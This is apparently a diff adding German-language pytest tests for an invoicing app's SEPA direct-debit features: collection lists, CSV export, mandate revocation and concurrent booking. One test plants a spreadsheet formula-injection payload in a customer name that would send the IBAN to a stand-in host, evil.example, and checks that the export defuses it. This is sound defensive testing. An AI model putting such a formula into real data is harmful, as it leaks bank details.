@@ -3743,3 +3743,256 @@ class TestQ5Mahnwesen:
             alt = db.get(Invoice, uuid.UUID(rechnung["id"]))
             assert (alt.status, alt.reminder_level) == (InvoiceStatus.UEBERFAELLIG, 1)
             assert alt.is_overdue is True
+
+
+def _q5_einreichen(client, ids, **extra):
+    return client.post("/api/v1/sepa/einreichung", json={"invoice_ids": ids, **extra})
+
+
+def _q5_versendet(client, monkeypatch, kunde):
+    """Festgeschrieben und per Mail versendet: Vorabankündigung rechtzeitig."""
+    rechnung = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+    _q5_mailen(client, monkeypatch, rechnung["id"])
+    return client.get(f"/api/v1/invoices/{rechnung['id']}").json()
+
+
+def _q5_nebenlaeufig(monkeypatch, tmp_path, modus):
+    """Zwei gleichzeitige Aufrufe (zwei Tabs, zwei Personen) auf dieselbe
+    Lastschriftrechnung, auf einer Mandanten-DB wie in Produktion
+    (tenancy._TenantRegistry: Datei, WAL; Muster des Q1-Nebenläufigkeitstests).
+    modus "einzug": Rechnung AUSSTEHEND; "ruecklastschrift": EINGEZOGEN und
+    bezahlt. Liefert (Ergebnisse, Zahlungsbeträge, paid_amount)."""
+    import threading
+    import time
+    from sqlalchemy import select
+    from app import tenancy
+    from app.database import Base
+    from app.models.customer import Customer, CustomerType
+    from app.models.invoice import Invoice, InvoiceStatus, InvoiceType, Payment, PaymentMethod
+    from app.models.sepa_mandate import LastschriftStatus, SepaMandat, Zahlungsart
+    from app.services import sepa_service
+    from app.services.invoice_service import InvoiceService
+
+    monkeypatch.setattr(tenancy, "TENANTS_DIR", tmp_path)
+    registry = tenancy._TenantRegistry()
+    Base.metadata.create_all(registry.get_engine("q5test"))
+    Session = registry.get_sessionmaker("q5test")
+    eingezogen = modus == "ruecklastschrift"
+    try:
+        with Session() as db:
+            kunde = Customer(name="Gasthof", typ=CustomerType.GASTRO, aktiv=True,
+                             zahlungsart=Zahlungsart.LASTSCHRIFT)
+            db.add(kunde)
+            db.flush()
+            mandat = SepaMandat(customer_id=kunde.id, mandatsreferenz="MG-1", unterschrieben_am=date(2026, 9, 1),
+                                kontoinhaber="Gasthof", iban=_Q5_IBAN)
+            db.add(mandat)
+            db.flush()
+            inv = Invoice(
+                invoice_number="RE-2026-00001", customer_id=kunde.id, invoice_type=InvoiceType.RECHNUNG,
+                status=InvoiceStatus.BEZAHLT if eingezogen else InvoiceStatus.OFFEN,
+                invoice_date=date.today(), due_date=date.today(),
+                subtotal=Decimal("20.00"), tax_amount=Decimal("1.40"), total=Decimal("21.40"),
+                paid_amount=Decimal("21.40") if eingezogen else Decimal("0"),
+                zahlungsart=Zahlungsart.LASTSCHRIFT, sepa_mandat_id=mandat.id, sepa_hinweis="Hinweis",
+                lastschrift_status=LastschriftStatus.EINGEZOGEN if eingezogen else LastschriftStatus.AUSSTEHEND,
+            )
+            db.add(inv)
+            db.flush()
+            if eingezogen:
+                db.add(Payment(invoice_id=inv.id, payment_date=date.today(), amount=Decimal("21.40"),
+                               payment_method=PaymentMethod.LASTSCHRIFT, reference="MG-1"))
+            db.commit()
+            inv_id = inv.id
+
+        # Nach dem Lesen langsam: ohne Sperre hätten beide den alten Stand gelesen.
+        if modus == "einzug":
+            original = InvoiceService.record_payment
+
+            def langsam(self, *a, **kw):
+                time.sleep(0.3)
+                return original(self, *a, **kw)
+            monkeypatch.setattr(InvoiceService, "record_payment", langsam)
+        else:
+            original = sepa_service._lastschrift_summe
+
+            def langsam(db, invoice_id):
+                time.sleep(0.3)
+                return original(db, invoice_id)
+            monkeypatch.setattr(sepa_service, "_lastschrift_summe", langsam)
+
+        start = threading.Barrier(2)
+        ergebnisse = []
+
+        def lauf():
+            try:
+                with Session() as db:
+                    start.wait()
+                    if modus == "einzug":
+                        sepa_service.einzug_buchen(db, [inv_id], date.today(), benutzer="q5")
+                    else:
+                        sepa_service.ruecklastschrift(db, inv_id, date.today(), "Widerspruch", benutzer="q5")
+                    db.commit()
+                    ergebnisse.append("ok")
+            except ValueError:
+                ergebnisse.append("abgelehnt")
+            except Exception as e:
+                ergebnisse.append(repr(e))
+
+        threads = [threading.Thread(target=lauf) for _ in range(2)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join(timeout=30)
+
+        with Session() as db:
+            betraege = sorted(db.execute(select(Payment.amount).where(Payment.invoice_id == inv_id)).scalars())
+            bezahlt = db.get(Invoice, inv_id).paid_amount
+        return sorted(ergebnisse), betraege, bezahlt
+    finally:
+        registry.dispose_tenant("q5test")
+
+
+class TestQ5Einzug:
+    def test_einzugsliste_nur_festgeschriebene_offene(self, client):
+        kunde, mandat = _q5_lastschriftkunde(client)
+        offen = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+        entwurf = _q5_entwurf(client, kunde)
+        bezahlt = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+        client.post(f"/api/v1/invoices/{bezahlt['id']}/payments", json={
+            "invoice_id": bezahlt["id"], "payment_date": date.today().isoformat(), "amount": "21.40"})
+        storniert = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+        client.post(f"/api/v1/invoices/{storniert['id']}/cancel", json={"reason": "Test"})
+        ueberweisung = _q5_festschreiben(client, _q5_entwurf(client, _q5_kunde(client, "Überweiser")))
+
+        zeilen = client.get("/api/v1/sepa/einzugsliste").json()
+
+        assert [z["invoice_number"] for z in zeilen] == [offen["invoice_number"]]
+        z = zeilen[0]
+        assert (z["iban"], z["mandatsreferenz"], Decimal(str(z["betrag"])), z["einzugsdatum"]) == (
+            _Q5_IBAN, mandat["mandatsreferenz"], Decimal("21.40"), offen["due_date"])
+        # Finalisiert, aber nie gemailt: Vorabankündigung nicht über das System versendet
+        assert (z["versendet_am"], z["ankuendigung"], z["eingereicht_am"]) == (None, "NICHT_PER_MAIL", None)
+        assert {entwurf["id"], ueberweisung["id"]}.isdisjoint({z["invoice_id"] for z in zeilen})
+        frueher = (date.fromisoformat(offen["due_date"]) - timedelta(days=1)).isoformat()
+        assert client.get("/api/v1/sepa/einzugsliste", params={"bis": frueher}).json() == []
+
+    def test_einreichung_liefert_csv_und_nur_einmal(self, client, monkeypatch):
+        kunde, mandat = _q5_lastschriftkunde(client)
+        offen = _q5_versendet(client, monkeypatch, kunde)
+        _q5_versendet(client, monkeypatch, kunde)  # zweite Rechnung, nicht angehakt
+
+        r = _q5_einreichen(client, [offen["id"]])
+
+        assert r.status_code == 200, r.text
+        assert r.headers["content-type"].startswith("text/csv")
+        assert r.content.startswith(b"\xef\xbb\xbf")
+        zeilen = r.content.decode("utf-8-sig").splitlines()
+        assert zeilen[0].startswith("Rechnungsnummer;Kunde;Kontoinhaber;IBAN")
+        assert len(zeilen) == 2  # nur die angehakte Rechnung
+        felder = zeilen[1].split(";")
+        assert felder[0] == offen["invoice_number"] and felder[3] == _Q5_IBAN
+        assert "21,40" in felder and mandat["mandatsreferenz"] in felder
+        liste = {z["invoice_id"]: z for z in client.get("/api/v1/sepa/einzugsliste").json()}
+        assert liste[offen["id"]]["eingereicht_am"] == date.today().isoformat()
+        assert liste[offen["id"]]["ankuendigung"] == "RECHTZEITIG"
+        # Zweiter Export derselben Rechnung (anderer Tag, zweite Person): abgelehnt
+        r = _q5_einreichen(client, [offen["id"]])
+        assert r.status_code == 409 and "bereits" in r.json()["detail"]
+
+    def test_einreichung_ohne_mailversand_nur_mit_bestaetigung(self, client):
+        from app.models.invoice import Invoice
+        kunde, _ = _q5_lastschriftkunde(client)
+        rechnung = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+
+        r = _q5_einreichen(client, [rechnung["id"]])
+        assert r.status_code == 409 and "Vorabankündigung" in r.json()["detail"]
+        assert client.get("/api/v1/sepa/einzugsliste").json()[0]["eingereicht_am"] is None
+
+        r = _q5_einreichen(client, [rechnung["id"]], ankuendigung_bestaetigt=True)
+        assert r.status_code == 200, r.text
+        with TestingSessionLocal() as db:
+            notiz = db.get(Invoice, uuid.UUID(rechnung["id"])).internal_notes
+        assert "SEPA-Einreichung" in notiz and "testuser" in notiz
+        assert "außerhalb des Systems bestätigt" in notiz
+
+    def test_csv_entschaerft_formel_im_kundennamen(self, client, monkeypatch, q5_rolle):
+        """Angriff: die Halle (darf Kundennamen ändern) setzt einen Namen, der
+        in Excel als Formel die IBAN aus Spalte D nach außen schickt."""
+        import csv
+        import io
+        kunde, _ = _q5_lastschriftkunde(client)
+        rechnung = _q5_versendet(client, monkeypatch, kunde)
+        boese = '=HYPERLINK("https://evil.example/?i="&D2;"Info")'
+        q5_rolle(["production_staff"])
+        r = client.patch(f"/api/v1/sales/customers/{kunde['id']}", json={"name": boese})
+        assert r.status_code == 200, r.text
+        q5_rolle(["accounting"])
+
+        r = _q5_einreichen(client, [rechnung["id"]])
+
+        assert r.status_code == 200, r.text
+        zeile = list(csv.reader(io.StringIO(r.content.decode("utf-8-sig")), delimiter=";"))[1]
+        assert zeile[1] == "'" + boese
+        assert not any(zelle.startswith(("=", "+", "-", "@")) for zelle in zeile)
+
+    def test_einzug_buchen(self, client):
+        kunde, mandat = _q5_lastschriftkunde(client)
+        rechnung = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+
+        r = client.post("/api/v1/sepa/einzug", json={"invoice_ids": [rechnung["id"]], "datum": date.today().isoformat()})
+
+        assert r.status_code == 200, r.text
+        assert r.json()["gebucht"] == [rechnung["invoice_number"]]
+        # Früher eingezogen als angekündigt: gebucht, aber mit Hinweis
+        assert len(r.json()["hinweise"]) == 1 and "angekündigt war" in r.json()["hinweise"][0]
+        detail = client.get(f"/api/v1/invoices/{rechnung['id']}").json()
+        assert (detail["status"], detail["lastschrift_status"]) == ("BEZAHLT", "EINGEZOGEN")
+        zahlung = detail["payments"][0]
+        assert (zahlung["payment_method"], zahlung["reference"]) == ("LASTSCHRIFT", mandat["mandatsreferenz"])
+        assert "testuser" in zahlung["notes"]
+        assert client.get("/api/v1/sepa/einzugsliste").json() == []
+        uebersicht = client.get(f"/api/v1/sepa/kunden/{kunde['id']}/mandate").json()
+        assert uebersicht["mandate"][0]["letzter_einzug_am"] == date.today().isoformat()
+
+    def test_einzugsdatum_geprueft(self, client):
+        kunde, _ = _q5_lastschriftkunde(client)
+        rechnung = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+        morgen = (date.today() + timedelta(days=1)).isoformat()
+        gestern = (date.today() - timedelta(days=1)).isoformat()
+
+        r = client.post("/api/v1/sepa/einzug", json={"invoice_ids": [rechnung["id"]], "datum": morgen})
+        assert r.status_code == 422, r.text
+        r = client.post("/api/v1/sepa/einzug", json={"invoice_ids": [rechnung["id"]], "datum": gestern})
+        assert r.status_code == 409 and "Rechnungsdatum" in r.json()["detail"]
+        assert client.get(f"/api/v1/invoices/{rechnung['id']}").json()["payments"] == []
+
+    def test_einzug_alles_oder_nichts(self, client):
+        kunde, _ = _q5_lastschriftkunde(client)
+        rechnung = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+        entwurf = _q5_entwurf(client, kunde)
+
+        r = client.post("/api/v1/sepa/einzug", json={
+            "invoice_ids": [rechnung["id"], entwurf["id"]], "datum": date.today().isoformat()})
+
+        assert r.status_code == 409, r.text
+        assert client.get(f"/api/v1/invoices/{rechnung['id']}").json()["status"] == "OFFEN"
+
+    def test_widerrufenes_mandat_wird_nicht_eingezogen(self, client):
+        kunde, mandat = _q5_lastschriftkunde(client)
+        rechnung = _q5_festschreiben(client, _q5_entwurf(client, kunde))
+        client.post(f"/api/v1/sepa/mandate/{mandat['id']}/widerruf", json={})
+
+        zeile = client.get("/api/v1/sepa/einzugsliste").json()[0]
+        assert zeile["mandat_aktiv"] is False
+        r = client.post("/api/v1/sepa/einzug", json={"invoice_ids": [rechnung["id"]], "datum": date.today().isoformat()})
+        assert r.status_code == 409 and "widerrufen" in r.json()["detail"]
+        r = _q5_einreichen(client, [rechnung["id"]], ankuendigung_bestaetigt=True)
+        assert r.status_code == 409 and "widerrufen" in r.json()["detail"]
+
+    def test_einzug_gleichzeitig_nur_einmal(self, monkeypatch, tmp_path):
+        """Zwei Tabs buchen denselben Einzug: genau eine Zahlung."""
+        ergebnisse, betraege, bezahlt = _q5_nebenlaeufig(monkeypatch, tmp_path, "einzug")
+        assert ergebnisse == ["abgelehnt", "ok"]
+        assert betraege == [Decimal("21.40")]
+        assert bezahlt == Decimal("21.40")
